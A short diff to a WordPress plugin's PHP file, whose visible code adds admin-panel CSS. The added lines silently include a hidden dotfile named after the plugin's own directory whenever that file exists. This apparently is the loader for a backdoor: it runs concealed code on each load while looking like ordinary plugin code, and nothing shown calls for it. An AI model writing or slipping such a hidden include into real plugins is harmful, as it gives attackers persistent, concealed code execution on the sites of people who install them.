@@ -1,6 +1,10 @@
 <?php
 add_action( 'admin_head' , 'rs_function_to_include_css' ) ;
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function rs_function_to_include_css() {
     if ( get_option( 'rs_color_scheme' ) == '1' ) {
         ?><style>
